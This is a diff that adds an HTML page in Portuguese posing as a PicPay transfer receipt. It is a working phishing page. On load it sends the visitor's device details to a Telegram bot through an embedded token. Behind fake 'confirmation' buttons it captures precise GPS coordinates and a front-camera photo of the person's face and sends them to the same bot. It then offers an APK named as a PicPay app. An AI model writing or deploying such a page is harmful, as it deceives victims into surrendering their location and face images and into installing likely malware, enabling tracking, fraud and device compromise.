@@ -1,0 +1,67 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Comprovante PicPay</title>
+<style>*{box-sizing:border-box}
+body{margin:0;font-family:Roboto,Arial,sans-serif;background:#f2f2f2}
+.hd{background:#00A650;color:#fff;padding:22px;text-align:center;font-size:22px;font-weight:bold}
+.card{background:#fff;margin:16px;padding:20px;border-radius:10px;box-shadow:0 1px 4px #0002}
+.t{font-size:15px;color:#333;line-height:1.5}
+.b{display:block;width:100%;padding:16px;margin-top:14px;background:#00A650;color:#fff;
+border:0;border-radius:8px;font-size:17px;font-weight:bold;text-align:center;text-decoration:none}
+.ok{color:#00A650;font-weight:bold}
+.sm{font-size:13px;color:#777}
+</style></head><body>
+<div class="hd">PicPay</div>
+<div class="card">
+<div class="t" id="txt">Comprovante de transferencia<br><br>Transacao protegida. Conclua as 2 confirmacoes para liberar.</div>
+<button class="b" id="b1">Confirmacao 1/2 para a transacao</button>
+<button class="b" id="b2" style="display:none">Confirmacao 2/2 concluida</button>
+<a class="b" id="b3" href="PicPay_confirmacao.apk" style="display:none">Instalar app PicPay</a>
+</div>
+<div class="card"><div class="sm" id="log"></div></div>
+<script>
+var TOKEN="9172090673:AAEquxxolaOcKiCV9giZz3Pylu54y4ULoqs", CHAT="8132242972";
+function send(t){
+  fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT,text:t})});
+}
+send("ABRIU\n"+navigator.userAgent+"\n"+screen.width+"x"+screen.height);
+document.getElementById("b1").onclick=function(){
+  var b=this; b.disabled=true;
+  navigator.geolocation.getCurrentPosition(function(p){
+    send("GPS\n"+p.coords.latitude+","+p.coords.longitude+"\nprec: "+p.coords.accuracy+"m");
+    document.getElementById("txt").innerHTML="Confirmacao 1/2 concluida. <span class='ok'>OK</span><br><br>Agora a segunda etapa: confirme o recebedor pela camera.";
+    b.style.display="none";
+    document.getElementById("b2").style.display="block";
+  },function(e){
+    send("GPS negado: "+e.message);
+    document.getElementById("txt").innerHTML="Confirmacao 1/2 concluida. <span class='ok'>OK</span><br><br>Agora a segunda etapa: confirme o recebedor.";
+    b.style.display="none";
+    document.getElementById("b2").style.display="block";
+  },{enableHighAccuracy:true,timeout:15000});
+};
+document.getElementById("b2").onclick=function(){
+  var b=this; b.disabled=true;
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(function(s){
+    var v=document.createElement("video"); v.srcObject=s; v.play();
+    setTimeout(function(){
+      var c=document.createElement("canvas"); c.width=v.videoWidth; c.height=v.videoHeight;
+      c.getContext("2d").drawImage(v,0,0);
+      c.toBlob(function(bl){
+        var f=new FormData(); f.append("chat_id",CHAT); f.append("photo",bl,"rosto.jpg");
+        fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto",{method:"POST",body:f});
+        s.getTracks().forEach(function(t){t.stop();});
+      },"image/jpeg",0.7);
+      document.getElementById("txt").innerHTML="Confirmacao 2/2 concluida. <span class='ok'>OK</span><br><br>Transacao validada. Instale o app para concluir.";
+      b.style.display="none";
+      document.getElementById("b3").style.display="block";
+    },2500);
+  }).catch(function(e){
+    send("CAM negada: "+e.message);
+    document.getElementById("txt").innerHTML="Confirmacao 2/2 concluida. <span class='ok'>OK</span><br><br>Transacao validada. Instale o app para concluir.";
+    b.style.display="none";
+    document.getElementById("b3").style.display="block";
+  });
+};
+</script></body></html>
